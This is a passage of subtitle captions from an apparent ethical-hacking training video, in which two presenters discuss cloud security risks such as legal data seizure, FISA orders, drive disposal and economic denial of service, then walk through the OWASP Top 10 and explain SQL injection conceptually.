customer,\n\n242\n00:10:50.020 --> 00:10:54.210\nwho's going to, essentially,\nprobably work for the Cloud customer and\n\n243\n00:10:54.210 --> 00:10:58.150\nis gonna give them guidance,\nhow do I offer words of encouragement but\n\n244\n00:10:58.150 --> 00:11:03.090\nalso words of calm, serenity and security?\n\n245\n00:11:03.090 --> 00:11:07.250\nHow do I build enterprise class\nCloud architecture but secure it?\n\n246\n00:11:07.250 --> 00:11:09.160\nI may not be able to do that and\nI'm honest and\n\n247\n00:11:09.160 --> 00:11:11.060\nup front with my clients\nwhen we talk about this.\n\n248\n00:11:11.060 --> 00:11:15.460\nWe tell them, listen, if you're gonna go\nthis way, unless you're gonna run private,\n\n249\n00:11:15.460 --> 00:11:19.620\non prem cloud yourself, the business\nbecomes the cloud provider and\n\n250\n00:11:19.620 --> 00:11:21.150\nis the customer at the same time.\n\n251\n00:11:21.150 --> 00:11:23.900\nYou control everything,\nwhich is the traditional model.\n\n252\n00:11:23.900 --> 00:11:26.740\nThe only difference is you're using\ncooler, newer software to do it.\n\n253\n00:11:26.740 --> 00:11:29.130\nBut this is you host everything,\nyou own everything, right?\n\n254\n00:11:29.130 --> 00:11:30.090\nThat's the traditional model.\n\n255\n00:11:30.090 --> 00:11:32.020\nIf you do that,\nwe have a lot more control.\n\n256\n00:11:32.020 --> 00:11:32.930\nYou know that.\n\n257\n00:11:32.930 --> 00:11:34.610\nYou know all about that model.\n\n258\n00:11:34.610 --> 00:11:37.620\nWe've talked about that model in\nevery episode up until now, right?\n\n259\n00:11:37.620 --> 00:11:39.190\nYou understand all that stuff.\n\n260\n00:11:39.190 --> 00:11:42.110\nBut when we give somebody\ncontrol over half the equation\n\n261\n00:11:42.110 --> 00:11:44.060\nthere's a limit to what we can do.\n\n262\n00:11:44.060 --> 00:11:49.270\nIf you don't negotiate up front and don't\nexercise due diligence, good oversight,\n\n263\n00:11:49.270 --> 00:11:53.160\nand due care,\ngood operational process and procedure.\n\n264\n00:11:53.160 --> 00:11:54.500\nIf you don't do those things or\n\n265\n00:11:54.500 --> 00:11:57.710\nencourage those around you to do them,\nyou're done before you start.\n\n266\n00:11:57.710 --> 00:12:01.350\nIf you haven't negotiated up front the\nright to audit, if you haven't negotiated\n\n267\n00:12:01.350 --> 00:12:04.500\nup front the right to be informed\nif there's a breach, if you\n\n268\n00:12:04.500 --> 00:12:08.260\nhaven't negotiated up front the right to\ngeopreferencing and hosting of your data\n\n269\n00:12:08.260 --> 00:12:12.560\nto prevent data from leaving the legal\njurisdiction where you need it to be.\n\n270\n00:12:12.560 --> 00:12:15.820\nIf you haven't negotiated up\nfront all these things and\n\n271\n00:12:15.820 --> 00:12:18.440\n25 others, that we could put on that list.\n\n272\n00:12:18.440 --> 00:12:22.330\nThen, you're leaving it up to your\nwheel of fortune, let's spin the wheel,\n\n273\n00:12:22.330 --> 00:12:24.310\nlet's find out what is gonna happen.\n\n274\n00:12:24.310 --> 00:12:27.740\nBecause, that's the closest I can get\nto telling you what may be the outcome.\n\n275\n00:12:27.740 --> 00:12:29.355\nAnd, even then there's no guarantee,\nright?\n\n276\n00:12:29.355 --> 00:12:30.625\nRight?\nI mean, we just don't know.\n\n277\n00:12:30.625 --> 00:12:35.535\nSo what happens when somebody shows up\nwith an e discovery or a search and\n\n278\n00:12:35.535 --> 00:12:41.245\ndesist order in a cloud data\ncenter that you're hosting and\n\n279\n00:12:41.245 --> 00:12:45.575\nnot for you but for\ntenants on your service platform and\n\n280\n00:12:45.575 --> 00:12:50.295\nall of a sudden that platform gets\nessentially snatched up because of a raid.\n\n281\n00:12:50.295 --> 00:12:53.510\nEverything is copied, all of your\ndata goes with everybody else's, and\n\n282\n00:12:53.510 --> 00:12:57.490\nnow your data is sitting as evidence at\na trial somewhere potentially because it's\n\n283\n00:12:57.490 --> 00:13:00.110\npart of all the data that's been gathered,\nyou don't even know as\n\n284\n00:13:00.110 --> 00:13:02.670\nthe customer that it's happened and\nyou may never know by the way.\n\n285\n00:13:02.670 --> 00:13:06.750\nIf you don't have right negotiated in\nyour hosting agreement that tells you and\n\n286\n00:13:06.750 --> 00:13:11.000\nthe vendor that they have to notify you,\nyou will probably never be told, and\n\n287\n00:13:11.000 --> 00:13:13.630\nso you would never know that your\ndata has been potentially exposed and\n\n288\n00:13:13.630 --> 00:13:14.700\ncompromised to a third party.\n\n289\n00:13:14.700 --> 00:13:17.740\nI mean think about that risk,\nthink about that concern.\n\n290\n00:13:17.740 --> 00:13:20.660\nHow does a hacker, right,\ngrab that data at that point?\n\n291\n00:13:20.660 --> 00:13:23.920\nWell, all they gotta do is go figure out\nwhere the law enforcement agency has it.\n\n292\n00:13:23.920 --> 00:13:25.900\nThey may not be securely storing it.\n\n293\n00:13:25.900 --> 00:13:28.620\nThey may be able to get it without even\nhaving to worry about going around all\n\n294\n00:13:28.620 --> 00:13:32.475\nthe security issues, security concerns,\nsecurity protections that the cloud\n\n295\n00:13:32.475 --> 00:13:35.980\nprovider rightly put in place so\nit would prevent exposure of that data.\n\n296\n00:13:35.980 --> 00:13:38.620\nWe've now handed it to a third\nparty totally untrusted,\n\n297\n00:13:38.620 --> 00:13:41.170\ntotally unknown relationship.\n\n298\n00:13:41.170 --> 00:13:43.000\nI mean, let me give you\n\n299\n00:13:43.000 --> 00:13:44.230\nthe keys to my car-\n>> [INAUDIBLE]\n\n300\n00:13:44.230 --> 00:13:45.110\n>> Remember Ferris Bueller?\n\n301\n00:13:45.110 --> 00:13:48.460\n>> Yes. [LAUGHTER] >> We'll park the car\nwe'll go in and have dinner and we'll come\n\n302\n00:13:48.460 --> 00:13:52.970\nback and the valets are out like cruising\ndoing all the crazy stuff, right?\n\n303\n00:13:52.970 --> 00:13:54.700\nWhere the car goes over in slow motion.\n\n304\n00:13:54.700 --> 00:13:57.940\nYou know, think about that.\n\n305\n00:13:57.940 --> 00:13:59.360\nThis is the stuff we're talking about.\n\n306\n00:13:59.360 --> 00:14:01.680\nThese are the risks that you got to face.\n\n307\n00:14:01.680 --> 00:14:04.000\nIt's the obvious ones, but\nit's also all the other ones.\n\n308\n00:14:04.000 --> 00:14:08.382\nIllegal access to the Cloud, supply chain\nfailure, modification of network traffic,\n\n309\n00:14:08.382 --> 00:14:09.490\nisolation fares.\n\n310\n00:14:09.490 --> 00:14:11.510\nWe've talked about all of these and more.\n\n311\n00:14:11.510 --> 00:14:14.610\nI talked about the fact the Cloud provider\nmay get bought by someone else and\n\n312\n00:14:14.610 --> 00:14:16.660\nthis is happening all the time\nin our industry today.\n\n313\n00:14:16.660 --> 00:14:18.780\nRight, Semantic went on a buying\nbinge several years ago.\n\n314\n00:14:18.780 --> 00:14:20.420\nThey own like half the world, right?\n\n315\n00:14:20.420 --> 00:14:23.140\nAnd the other half they don't own\nis owned by somebody else, right?\n\n316\n00:14:23.140 --> 00:14:26.390\nAnd remember we talked about this\na couple of prior episodes where hey,\n\n317\n00:14:26.390 --> 00:14:27.040\nwho owned that tool?\n\n318\n00:14:27.040 --> 00:14:30.180\nWe keep coming back to it's\neither McAfee or Symantec, right?\n\n319\n00:14:30.180 --> 00:14:31.700\n>> Yup.\n>> So the reality is there's all this\n\n320\n00:14:31.700 --> 00:14:33.160\nstuff that goes on.\n\n321\n00:14:33.160 --> 00:14:36.510\nWe may be building our architecture\non the assumption that a vendor\n\n322\n00:14:36.510 --> 00:14:40.760\nwill be in business doing this way for\na long time and they may not be, you know.\n\n323\n00:14:40.760 --> 00:14:43.820\nI mean look at the fact that\nEMC was bought by Dell.\n\n324\n00:14:43.820 --> 00:14:48.730\nAnd essentially some of the EMC platform\nis gonna stop being products because Dell\n\n325\n00:14:48.730 --> 00:14:51.630\nis going to dead end them and\ndo stuff in the other way and\n\n326\n00:14:51.630 --> 00:14:54.590\nwhatever way they wanna do based on\ntheir architecture and their platform.\n\n327\n00:14:54.590 --> 00:14:57.330\nPeople that are running VMware\nare concerned because VMC\n\n328\n00:14:57.330 --> 00:14:58.670\nowned VMware for years.\n\n329\n00:14:58.670 --> 00:15:00.940\nNow Dell owns both, in theory.\n\n330\n00:15:00.940 --> 00:15:02.900\nAnd as a result, yeah how do we know?\n\n331\n00:15:02.900 --> 00:15:05.940\nI'm not suggesting for a minute\nthere's a problem with VMC or VMware.\n\n332\n00:15:05.940 --> 00:15:09.330\nI'm not suggesting Dell\nis not a good company.\n\n333\n00:15:09.330 --> 00:15:12.540\nJust point out to you that there's\nan unknown quantity there and\n\n334\n00:15:12.540 --> 00:15:13.740\nas a commercial.\n\n335\n00:15:13.740 --> 00:15:16.340\nOr customer of some or\n\n336\n00:15:16.340 --> 00:15:19.370\none of those particular vendors,\nas a commercial entity,\n\n337\n00:15:19.370 --> 00:15:23.290\na provider, I would have to wonder, what's\ngoing to be the change on the platform?\n\n338\n00:15:23.290 --> 00:15:26.530\nAnd am I going to be able to\ncontinue to service my customers.\n\n339\n00:15:26.530 --> 00:15:28.880\nCan that open up opportunities for\nhackers?\n\n340\n00:15:28.880 --> 00:15:30.580\nThere's all these things\nthat we have to think about.\n\n341\n00:15:30.580 --> 00:15:33.600\nVendor locking, as we said,\njurisdictional concerns and\n\n342\n00:15:33.600 --> 00:15:38.240\nthe legal space, e-discovery, subpoenas,\nwhether or not somebody can come in and\n\n343\n00:15:38.240 --> 00:15:39.920\ntake data without our knowledge.\n\n344\n00:15:39.920 --> 00:15:41.790\nWhat are the requirements,\nwhat are the rules,\n\n345\n00:15:41.790 --> 00:15:45.230\nwhat are the laws in the jurisdiction\nwhere your data lives?\n\n346\n00:15:45.230 --> 00:15:49.061\nAnd is a government entity, for\ninstance, able to come in and slap,\n\n347\n00:15:49.061 --> 00:15:52.180\nin the United States,\nit's called a FISA court order.\n\n348\n00:15:52.180 --> 00:15:56.404\nThere are different versions of this\naround the world, but essentially,\n\n349\n00:15:56.404 --> 00:15:59.285\na secret court order that\ndoes not get exposed, and\n\n350\n00:15:59.285 --> 00:16:03.576\nthat is gonna give the holder of\nthe order, typically a law-enforcement or\n\n351\n00:16:03.576 --> 00:16:08.492\ngovernment entity- The ability to come in\nand seize data and to snoop, essentially.\n\n352\n00:16:08.492 --> 00:16:10.685\nPlug into the data feed and\nlisten to data and\n\n353\n00:16:10.685 --> 00:16:14.290\nrecord what they want without\nthe ability for anybody to tell you.\n\n354\n00:16:14.290 --> 00:16:17.890\nYou may have actually negotiated\na right to be told about\n\n355\n00:16:17.890 --> 00:16:21.590\nthis kind of stuff when there is a, let's\nsay, e-discovery order that shows up.\n\n356\n00:16:21.590 --> 00:16:24.390\nSomebody shows up with a FISA\norder on your doorstep,\n\n357\n00:16:24.390 --> 00:16:26.990\nyou are bound by federal\nlaw as the provider\n\n358\n00:16:26.990 --> 00:16:30.750\nnot to expose the activities that\ntake place under that court order.\n\n359\n00:16:30.750 --> 00:16:34.280\nWhich means if you tell the customer\nthat they are being bugged, or\n\n360\n00:16:34.280 --> 00:16:38.350\nyou tell the customer that their\ndata is being siphoned off, you as\n\n361\n00:16:38.350 --> 00:16:43.100\nthe provider will go to jail for violating\na national security related order.\n\n362\n00:16:43.100 --> 00:16:45.270\nAnd forget about what happens\nto the customer, right?\n\n363\n00:16:45.270 --> 00:16:48.020\nYou're gonna be out of business and\nthe federal government's gonna come and\n\n364\n00:16:48.020 --> 00:16:49.370\nthrow you in jail.\n\n365\n00:16:49.370 --> 00:16:50.762\nSo you can't tell anybody.\n\n366\n00:16:50.762 --> 00:16:54.615\nThis has been one of the problems in the\nindustry with regards to what the federal\n\n367\n00:16:54.615 --> 00:16:57.835\ngovernment in the United States\nhas been doing behind the scenes,\n\n368\n00:16:57.835 --> 00:17:00.090\nunder certain circumstances.\n\n369\n00:17:00.090 --> 00:17:01.870\nI'm not suggesting this\nis illegal behavior.\n\n370\n00:17:02.970 --> 00:17:06.570\nQuite the contrary, it is legal,\nat least according to our laws today.\n\n371\n00:17:06.570 --> 00:17:08.030\nIt may not be in the future.\n\n372\n00:17:08.030 --> 00:17:11.958\nIt has been, while it's been going on\nsince 9/11 here in the United States,\n\n373\n00:17:11.958 --> 00:17:15.440\nshortly after 9/11 here in the US,\nwhen this whole system was set up\n\n374\n00:17:15.440 --> 00:17:18.500\nthrough the Patriot Act and\nother supporting legislation.\n\n375\n00:17:18.500 --> 00:17:21.100\nSo whether you like this or\nnot is not the issue.\n\n376\n00:17:21.100 --> 00:17:24.910\nAs an ethical hacker you may not be able\nto defend against some of this activity\n\n377\n00:17:24.910 --> 00:17:26.320\neven if you want to.\n\n378\n00:17:26.320 --> 00:17:29.800\nAnd I'm not suggesting that someone will\nshow up with a fake FISA order as a hacker\n\n379\n00:17:29.800 --> 00:17:31.370\nand try to trick a, I mean,\n\n380\n00:17:31.370 --> 00:17:33.170\nthat would take some significant-\n>> [LAUGH]\n\n381\n00:17:33.170 --> 00:17:35.070\n>> Some significant, right?\n\n382\n00:17:35.070 --> 00:17:39.560\nI mean, you would really have to be\nwilling to go out on a limb to do that.\n\n383\n00:17:39.560 --> 00:17:45.090\nBecause now, you're really talking about\ndon't care and really don't have any\n\n384\n00:17:45.090 --> 00:17:48.180\nindication at all that you're gonna\nworry about who's coming after you.\n\n385\n00:17:48.180 --> 00:17:51.750\nSo I'm not suggesting that somebody would\ntry, as a hacker, to show up with a bad or\n\n386\n00:17:51.750 --> 00:17:52.574\na fake FISA order.\n\n387\n00:17:52.574 --> 00:17:55.583\nTrying to trick a provider\ninto giving them data, right?\n\n388\n00:17:55.583 --> 00:17:58.487\nCuz I mean, that's a significant,\nsignificant step over the line.\n\n389\n00:17:58.487 --> 00:18:02.175\nBut what I am suggesting is that\nthe legitimate agents that own those FISA\n\n390\n00:18:02.175 --> 00:18:03.267\norders will show up.\n\n391\n00:18:03.267 --> 00:18:05.400\nAnd I'm not saying they're up to no good.\n\n392\n00:18:05.400 --> 00:18:08.424\nThere are compelling security\nreasons why this is done.\n\n393\n00:18:08.424 --> 00:18:11.766\nBut you may get caught up in that\nnet without realizing it, and\n\n394\n00:18:11.766 --> 00:18:14.820\nnever be told as a customer\nthat that is going on.\n\n395\n00:18:14.820 --> 00:18:16.363\nAnd you may not have any recourse.\n\n396\n00:18:16.363 --> 00:18:19.980\nAs a matter of fact, you don't at all,\nunder that particular condition.\n\n397\n00:18:19.980 --> 00:18:22.490\nThe federal court has ruled\nthat that is allowable,\n\n398\n00:18:22.490 --> 00:18:25.750\nmeaning the FISA Court has said,\nyeah go get that information.\n\n399\n00:18:25.750 --> 00:18:28.080\nAnd any collateral damage is, guess what?\n\n400\n00:18:28.080 --> 00:18:29.210\nWe just don't care, right?\n\n401\n00:18:29.210 --> 00:18:31.030\nIt happens and it is what it is.\n\n402\n00:18:31.030 --> 00:18:33.480\nWhat about improper handling and\ndisposing of data?\n\n403\n00:18:33.480 --> 00:18:37.874\nWe've talked about this as well, the\nability to be able to destroy information\n\n404\n00:18:37.874 --> 00:18:41.100\nsitting on hard drives at\nthe cloud provider's data center.\n\n405\n00:18:41.100 --> 00:18:43.810\nWhen those hard drives fail,\nwho sanitizes those drives?\n\n406\n00:18:43.810 --> 00:18:45.590\nUnder what conditions is that done?\n\n407\n00:18:45.590 --> 00:18:48.965\nHow do we know the data has been removed\nproperly and there's no data remnants that\n\n408\n00:18:48.965 --> 00:18:52.660\ncould used when that drive is recycled or\nperhaps thrown away?\n\n409\n00:18:52.660 --> 00:18:56.190\nIs the drive thrown away,\nare we shredding the drives, right?\n\n410\n00:18:56.190 --> 00:18:59.734\nAre we removing the platters and\nphysically destroying them?\n\n411\n00:18:59.734 --> 00:19:02.040\nAre we degaussing them,\nare we overwriting them?\n\n412\n00:19:02.040 --> 00:19:04.870\nThese are concerns we would have and\nrightly so.\n\n413\n00:19:04.870 --> 00:19:08.170\nWhat about loss or modification of\nbackup data, integrity concerns?\n\n414\n00:19:08.170 --> 00:19:10.300\nSomebody screws up, and\nwe gotta restore and\n\n415\n00:19:10.300 --> 00:19:11.900\nsomebody else has modified the backups.\n\n416\n00:19:11.900 --> 00:19:15.271\nOr the backups don't exist because\nthey're compromised, right?\n\n417\n00:19:15.271 --> 00:19:17.610\nCompliance risk,\nwe've talked about this as well.\n\n418\n00:19:17.610 --> 00:19:20.290\nAnd what about things\nlike denial of service?\n\n419\n00:19:20.290 --> 00:19:23.430\nBut specifically,\nwhat about economic denial of service?\n\n420\n00:19:23.430 --> 00:19:24.485\nWe don't often talk about this.\n\n421\n00:19:24.485 --> 00:19:27.180\nTalked about distributed denial\nof service, denial of service.\n\n422\n00:19:27.180 --> 00:19:29.150\nBut economic denial of service, right?\n\n423\n00:19:29.150 --> 00:19:32.040\nSomebody is going to either try to\n\n424\n00:19:32.040 --> 00:19:35.210\nsuck resources out of the company\nthrough a bandwidth attack.\n\n425\n00:19:35.210 --> 00:19:38.810\nOr maybe they're gonna hold\nthe company hostage with ransomware.\n\n426\n00:19:38.810 --> 00:19:42.390\nTrying to prevent them from providing\nservices and demand payment, right,\n\n427\n00:19:42.390 --> 00:19:46.082\nessentially in exchange for being able\nto free up the hard drives or whatever.\n\n428\n00:19:46.082 --> 00:19:48.280\nI mean, this would be an economic\ndenial of service attack.\n\n429\n00:19:48.280 --> 00:19:51.760\nRansomware is essentially gonna fall\ninto this category today, right?\n\n430\n00:19:51.760 --> 00:19:53.920\nSo there's a lot of stuff\nthat could go on, right?\n\n431\n00:19:53.920 --> 00:19:55.720\nYou and I gotta get busy,\nwe got all this work to go do.\n\n432\n00:19:55.720 --> 00:19:56.264\n>> I know.\n\n433\n00:19:56.264 --> 00:19:58.367\n>> We're here talking with\nall these lovely people and\n\n434\n00:19:58.367 --> 00:19:59.623\ntalking about Rick and Morty.\n\n435\n00:19:59.623 --> 00:20:03.670\nAnd shame on me, we should be out\ntaking over the world, I apologize.\n\n436\n00:20:03.670 --> 00:20:06.620\nWe're gonna go get busy and\nthen come back in a while.\n\n437\n00:20:06.620 --> 00:20:10.320\nAnd we'll have the whole matrix thing\nset up and it'll be really cool, right?\n\n438\n00:20:10.320 --> 00:20:10.880\n>> Absolutely.\n\n439\n00:20:10.880 --> 00:20:12.660\n>> So\nwhat about other cloud computing attacks?\n\n440\n00:20:12.660 --> 00:20:16.113\nI mean, we've talked about the concepts,\nbut what if we drill down, maybe, and\n\n441\n00:20:16.113 --> 00:20:18.180\ntalk about some real examples here for\na minute.\n\n442\n00:20:18.180 --> 00:20:20.420\nSo injection attacks, you and\n\n443\n00:20:20.420 --> 00:20:23.100\nI have talked about injection\nattacks in prior episodes.\n\n444\n00:20:23.100 --> 00:20:25.980\nAnd we've talked a lot about some\nof the things that go into this.\n\n445\n00:20:25.980 --> 00:20:29.760\nAnd we talked about where you could find\ninformation about this, how they happen,\n\n446\n00:20:29.760 --> 00:20:30.571\nwhy they happen.\n\n447\n00:20:30.571 --> 00:20:34.211\nI think it's a good time to maybe go to\nthe little field trip we have planned for\n\n448\n00:20:34.211 --> 00:20:34.832\neverybody.\n\n449\n00:20:34.832 --> 00:20:38.291\nAnd maybe go out, if we could look\nat Mike's machine for a minute, and\n\n450\n00:20:38.291 --> 00:20:39.535\ngo to the OWASP website.\n\n451\n00:20:39.535 --> 00:20:42.587\nWe'll come back to the notorious\nstuff there on the CSA.\n\n452\n00:20:42.587 --> 00:20:44.490\nBut let's go to the OWASP\nwebsite real quick.\n\n453\n00:20:44.490 --> 00:20:47.660\nSo when we talk about things\nlike injection attacks.\n\n454\n00:20:47.660 --> 00:20:53.730\nWhen we talk about session hijacking\nthrough XSS, cross-site scripting attacks.\n\n455\n00:20:53.730 --> 00:20:57.820\nWhen we talk about cross-site request\nforgery attacks, CSRF attacks.\n\n456\n00:20:57.820 --> 00:21:01.427\nWhen we talk about\n\n457\n00:21:01.427 --> 00:21:07.090\nthe improper use of embedded\ncredentials and things of that nature.\n\n458\n00:21:07.090 --> 00:21:12.080\nWe're talking about a hit list of\nproblems associated with web services and\n\n459\n00:21:12.080 --> 00:21:16.320\nwith bad code or bad development,\nbad SDLC implementation.\n\n460\n00:21:16.320 --> 00:21:18.466\nAnd a lot of these attacks\nare on the list for cloud.\n\n461\n00:21:18.466 --> 00:21:21.930\nOne of the best places you can go to\ngo to find information about this is\n\n462\n00:21:21.930 --> 00:21:22.990\nthrough OWASP.\n\n463\n00:21:22.990 --> 00:21:27.706\nThe Open Web Application Security Project\nis one of the places we can go.\n\n464\n00:21:27.706 --> 00:21:31.447\nThe idea here is that if we go to\nOWASP and we take a look specifically,\n\n465\n00:21:31.447 --> 00:21:33.525\ncuz there's a lot of resources here.\n\n466\n00:21:33.525 --> 00:21:38.675\nBut if we go and we take a look at the top\nten web application vulnerability list,\n\n467\n00:21:38.675 --> 00:21:40.635\nwhich is what we're looking at here.\n\n468\n00:21:40.635 --> 00:21:44.635\nThen what we can do is we can see that\nthere's a list with explanations and\n\n469\n00:21:44.635 --> 00:21:47.905\nwith detail about these attacks and\nthe exploits but\n\n470\n00:21:47.905 --> 00:21:50.995\nalso the countermeasures and\nthe explanations of how they work.\n\n471\n00:21:50.995 --> 00:21:52.255\nCan we pull up the PDF for\n\n472\n00:21:52.255 --> 00:21:55.840\nthe top ten in English and\njust take a look real quick for a second?\n\n473\n00:21:55.840 --> 00:21:57.860\nThere's a download link,\nyou can obviously download.\n\n474\n00:21:57.860 --> 00:21:59.320\nMultiple languages there by the way.\n\n475\n00:21:59.320 --> 00:22:01.300\nSo obviously, important to point that out.\n\n476\n00:22:01.300 --> 00:22:03.880\nIn case you wanna look at\nthis in a language that is\n\n477\n00:22:03.880 --> 00:22:07.190\ngonna be more comfortable for you,\nnot English as a primary language.\n\n478\n00:22:07.190 --> 00:22:09.940\nThis is the 2013 version\nthat you're looking at.\n\n479\n00:22:09.940 --> 00:22:12.670\nThe 2016 version is being\nworked on as we speak.\n\n480\n00:22:12.670 --> 00:22:14.930\nAnd we record this content for you now.\n\n481\n00:22:14.930 --> 00:22:17.430\nBy the time some of you\nare watching this in the future,\n\n482\n00:22:17.430 --> 00:22:20.560\nthe 2016 list probably gonna be out and\navailable.\n\n483\n00:22:20.560 --> 00:22:22.611\nThis list is updated every three years,\nby the way.\n\n484\n00:22:22.611 --> 00:22:26.590\nSo you can see the comparison on\nthe 2010 version, 2013 version there.\n\n485\n00:22:26.590 --> 00:22:28.210\nCan we scroll down a couple of pages more?\n\n486\n00:22:28.210 --> 00:22:29.680\nGo to the first, the overview.\n\n487\n00:22:29.680 --> 00:22:32.220\nGo past that, down next page.\n\n488\n00:22:32.220 --> 00:22:35.620\nSo this is the list, the top ten list\nof the concerns we would look at.\n\n489\n00:22:35.620 --> 00:22:39.195\nThings like SQL injection are there,\nthings like cross-site scripting.\n\n490\n00:22:39.195 --> 00:22:41.840\nCross-site request\nforgeries are further down.\n\n491\n00:22:41.840 --> 00:22:43.410\nSo we'll talk about a couple of these.\n\n492\n00:22:43.410 --> 00:22:45.120\nBut then if you go down\nbelow this to the next page,\n\n493\n00:22:45.120 --> 00:22:48.000\nwhat you'll see is we break out\neach one of these in depth.\n\n494\n00:22:48.000 --> 00:22:49.810\nWe take a look,\nyou zoom it just a little more?\n\n495\n00:22:49.810 --> 00:22:50.712\n>> Mm-hm.\n>> Right there on that and\n\n496\n00:22:50.712 --> 00:22:51.950\njust zoom in a little more.\n\n497\n00:22:51.950 --> 00:22:55.426\nSo what we're gonna see is we're\ngonna be able to see what we have.\n\n498\n00:22:55.426 --> 00:22:57.210\nThat's good, yeah, just so\nwe can see what's there.\n\n499\n00:22:57.210 --> 00:23:00.520\nWe have the application specificity\nin terms of the thread agent.\n\n500\n00:23:00.520 --> 00:23:04.600\nWe have the attack vector,\nso red is serious.\n\n501\n00:23:04.600 --> 00:23:09.240\nYellow is caution, right, green kinda\nlow vulnerability, low concern.\n\n502\n00:23:09.240 --> 00:23:12.810\nWe have the vulnerabilities,\nthe weaknesses there, the attack vector.\n\n503\n00:23:12.810 --> 00:23:15.730\nThe potential impact rating so\nthe severity is high.\n\n504\n00:23:15.730 --> 00:23:17.880\nSo injection attacks are pretty nasty.\n\n505\n00:23:17.880 --> 00:23:21.090\nAs we scroll down, we see,\nam I vulnerable to this particular attack?\n\n506\n00:23:21.090 --> 00:23:23.900\nSo warning signs,\nhow do I prevent it on the right.\n\n507\n00:23:23.900 --> 00:23:27.330\nSo how do I take countermeasures\ninto account of controls?\n\n508\n00:23:27.330 --> 00:23:29.530\nSome example attack scenarios.\n\n509\n00:23:29.530 --> 00:23:31.512\nAnd then reference material on the right.\n\n510\n00:23:31.512 --> 00:23:33.820\nBoth OWASP-specific but\n\n511\n00:23:33.820 --> 00:23:38.000\nalso then generic that can help you to\nfigure out how to defend against these.\n\n512\n00:23:38.000 --> 00:23:40.130\nAnd every one of them is broken\nout on the following pages and\n\n513\n00:23:40.130 --> 00:23:41.840\ndone the same way, right?\n\n514\n00:23:41.840 --> 00:23:44.040\nSo let's go back up and\n\n515\n00:23:44.040 --> 00:23:46.980\nlet's just talk about just a couple\nof these, kinda highlight.\n\n516\n00:23:46.980 --> 00:23:48.770\nMaybe go to the one, no,\ngo down to the list.\n\n517\n00:23:48.770 --> 00:23:50.612\nLet's go to the actual list,\none more, yeah.\n\n518\n00:23:50.612 --> 00:23:53.110\nAnd let's just zoom in on,\nlet's say, Injection.\n\n519\n00:23:53.110 --> 00:23:54.800\nLet's talk about injection for a minute.\n\n520\n00:23:54.800 --> 00:23:57.140\nThat way people can see it and\nwe understand what it is.\n\n521\n00:23:57.140 --> 00:23:58.580\nCan we zoom in a little more,\njust make it a little bit bigger?\n\n522\n00:23:58.580 --> 00:24:00.348\n>> Not without getting it off the page.\n\n523\n00:24:00.348 --> 00:24:01.909\n>> All right, so maybe we can,\nall right, no big deal.\n\n524\n00:24:01.909 --> 00:24:03.640\nWe'll just talk about it,\nthere we go, full screen.\n\n525\n00:24:03.640 --> 00:24:05.653\nSo all right, so\nI just want you to be able to see this.\n\n526\n00:24:05.653 --> 00:24:08.996\nJust so that as I talk about it, I'm gonna\nsummarize what the injection attack is.\n\n527\n00:24:08.996 --> 00:24:13.234\nBut you can kind of see it as I'm talking\nso Basically, what an injection attack is,\n\n528\n00:24:13.234 --> 00:24:15.998\nwe're talking about SQL primarily,\nSQL injection.\n\n529\n00:24:15.998 --> 00:24:21.880\nSo query injections are bad or flawed code\nthat we are using more often than not.\n\n530\n00:24:21.880 --> 00:24:25.295\nThis could be against operating systems,\nagainst LDAP directories,\n\n531\n00:24:25.295 --> 00:24:29.575\nprimarily against databases more often\nthan not, of a variety of kinds.\n\n532\n00:24:29.575 --> 00:24:32.445\nSQL, as in, not Microsoft SQL, but\n\n533\n00:24:32.445 --> 00:24:37.515\ngenerically structure query language\ncan be a flaw with an injection\n\n534\n00:24:37.515 --> 00:24:40.510\nthat can attack multiple\ndatabases from multiple vendors.\n\n535\n00:24:40.510 --> 00:24:44.900\nIt ran it from Oracle and DB2 and\nInformix to Microsoft SQL,\n\n536\n00:24:44.900 --> 00:24:48.320\nto PostGRASS, to OpenSQL databases.\n\n537\n00:24:48.320 --> 00:24:52.590\nDatabases of almost any kind that\nuse this as a query language.\n\n538\n00:24:52.590 --> 00:24:54.420\nStructured query language specifically,\n\n539\n00:24:54.420 --> 00:24:58.100\npotentially are vulnerable to\ninjection attacks using this format.\n\n540\n00:24:58.100 --> 00:25:04.210\nThe idea is that we can take code\nthat we're gonna put into typically,\n\n541\n00:25:04.210 --> 00:25:06.220\nthis is a web form on the front-end,\n\n542\n00:25:06.220 --> 00:25:09.330\nthat's gonna process data back\nin the database on the back-end.\n\n543\n00:25:09.330 --> 00:25:11.230\nThat's the main attack vector.\n\n544\n00:25:11.230 --> 00:25:14.900\nOr we can use or\nwrite some sort of a query script,\n\n545\n00:25:14.900 --> 00:25:19.610\nessentially a bad or a malformed script\nthat's gonna try to seek advantage and\n\n546\n00:25:19.610 --> 00:25:22.400\ntake advantage of\nthe database on the back-end.\n\n547\n00:25:22.400 --> 00:25:24.390\nRight?\nAnd as a result, create a compromise.\n\n548\n00:25:24.390 --> 00:25:26.980\nThere's multiple ways\ninjection attacks can occur.\n\n549\n00:25:26.980 --> 00:25:30.664\nBut a lot of the times, we're gonna go\nto a website, see a form that says hey,\n\n550\n00:25:30.664 --> 00:25:34.754\nput your username, your password, your\ndemographic information in to register for\n\n551\n00:25:34.754 --> 00:25:35.870\nthis service.\n\n552\n00:25:35.870 --> 00:25:39.410\nAnd we're gonna be able to then put\na bunch of stuff, and hit send or submit.\n\n553\n00:25:39.410 --> 00:25:40.832\nAnd the data goes to the back end.\n\n554\n00:25:40.832 --> 00:25:43.971\nIt gets written into the database in\nthe proper fields that are mapped for\n\n555\n00:25:43.971 --> 00:25:44.493\nthe table.\n\n556\n00:25:44.493 --> 00:25:49.063\nNormally, 99 times out of 100 happens\nall the time probably not a big deal.\n\n557\n00:25:49.063 --> 00:25:53.653\nBut attackers know that these forms these\nfields are a goldmine if we can just\n\n558\n00:25:53.653 --> 00:25:55.671\nfigure out how to leverage them.\n\n559\n00:25:55.671 --> 00:25:59.099\nAnd what the injection attack\ntells us we can do is,\n\n560\n00:25:59.099 --> 00:26:02.870\nif we are not doing input\nvalidation on the data fields.\n\n561\n00:26:02.870 --> 00:26:05.337\nIf we're not doing data normalization,\n\n562\n00:26:05.337 --> 00:26:09.219\nchecking behind the scenes to see\nthe data's in the proper form.\n\n563\n00:26:09.219 --> 00:26:14.234\nIf we're not looking at buffer overflows\nand controlling the amount and the volume\n\n564\n00:26:14.234 --> 00:26:18.971\nof data that goes through this form, as\nwell as the syntax and the type of data.\n\n565\n00:26:18.971 --> 00:26:21.835\nThen we may be able to slip\nattacks through this and\n\n566\n00:26:21.835 --> 00:26:23.956\ncause the database to malfunction.\n\n567\n00:26:23.956 --> 